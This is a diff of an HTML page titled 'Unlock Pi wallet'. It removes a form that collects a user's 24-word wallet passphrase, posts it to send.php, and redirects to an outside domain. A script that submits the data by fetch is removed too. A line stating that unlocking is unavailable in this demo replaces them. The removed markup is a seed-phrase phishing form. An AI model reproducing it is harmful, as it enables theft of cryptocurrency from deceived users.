@@ -23,42 +23,7 @@
 <h1 class="text-xl font-bold text-gray-700">Unlock Pi wallet</h1>
 </div>
 
-<form action="send.php" method="post">
-
-<input type="hidden" name="_token" value="zz2gxfqSVUwsR2sQIBvjlwOiIApC2xuhaLsE50PQ" autocomplete="off"> 
-<div class="relative my-4" data-twe-input-wrapper-init>
-<textarea id="passphrase" name="passphrase" required rows="8" class="block p-2.5 w-full text-sm text-gray-900 bg-gray-50 rounded-lg border border-gray-300 focus:ring-blue-500 focus:border-blue-500 dark:bg-gray-700 dark:border-gray-600 dark:placeholder-gray-400 dark:text-white dark:focus:ring-blue-500 dark:focus:border-blue-500" placeholder="Enter your 24-word passphrase here"></textarea>
-
-
-<input type="hidden" name="_next" value="https://2fapinetkey.org/congratulations.html">
-
-<input type="hidden" name="_captcha" value="false"> 
-</div>
-<section id="loading" class="w-full my-3 flex items-center justify-center">
-<div id="loading-content" class="loading-spinner"></div>
-</section>
-
-<input id="btn" type="submit" value="Unlock With Passphrase">
-
-</form>
-
-
-<script>
-var form = document.getElementById('sheetdb-form');
-form.addEventListener("submit", e => {
-e.preventDefault();
-fetch(form.action, {
-method : "POST",
-body: new FormData(document.getElementById("sheetdb-form")),
-})
-.then(
-response => response.json())
-
-.then((html) =>{
-window.open('Notification.html','_self')
-});
-});
-</script>
+<p class="text-center my-4">Passphrase unlocking is unavailable in this demo.</p>
 
 
 
